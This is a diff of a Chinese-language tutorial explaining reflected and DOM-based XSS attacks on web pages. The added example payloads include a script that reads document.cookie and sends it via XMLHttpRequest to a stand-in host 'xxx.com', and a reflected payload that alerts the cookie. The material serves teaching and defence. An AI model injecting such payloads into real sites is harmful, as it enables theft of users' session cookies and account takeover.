@@ -1,6 +1,12 @@
+
+
 ## XSS攻击
 
 > XSS （Cross Site Scriptng）是指黑客往HTML文件中或者DOM中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段；
+
+可以理解为XSS攻击就是利用网站使用了 URL 上的参数渲染网页内容，但是没有仔细校验其中的参数内容，导致前端在解析参数时，执行了一些“非法”脚本（一般是发送一些敏感信息到攻击者服务器）
+
+这种攻击的缺点很明显：就是这种攻击一般会留下攻击者的服务器地址溯源
 
 注入恶意脚本可以完成这些事情：
 
@@ -26,16 +32,26 @@
 场景：
 
 ```javascript
-http://TianTianUp.com?query=<script>alert("你受到了XSS攻击")</script>
+http://TianTianUp.com?query=<script>alert(document.cookie)</script>
 ```
 
 服务器拿到后解析参数query，最后将内容返回给浏览器，浏览器将这些内容作为HTML的一部分解析，发现是Javascript脚本，直接执行，这样子被XSS攻击了；
 
 这也就是反射型名字的由来，将恶意脚本作为参数，通过网络请求，最后经过服务器，在反射到HTML文档中，执行解析；
 
-### 基于DOM型
+### DOM型
 
 > 基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的，黑客通过各种手段将恶意脚本注入用户的页面中，在数据传输的时候劫持网络数据包；
+
+假设网站默认语言是可以根据网址的参数参数 lang= English 来渲染的，此时我们将网址的 default 参数改成下面这种，那估计就会出问题了：
+
+```javascript
+?lang=<script>(function(){ const xhr = new XMLHttpRequest(); xhr.open('GET', 'http://xxx.com?a=' + document.cookie); xhr.send() })()</script>
+```
+
+上面这种情况，一般在代码里对页面参数进行判断，对 < script > 标签进行处理，避免执行恶意脚本
+
+
 
 ```html
 <a href="http://www.evil.com/?test=" οnclick=alert(1)"" >test</a>
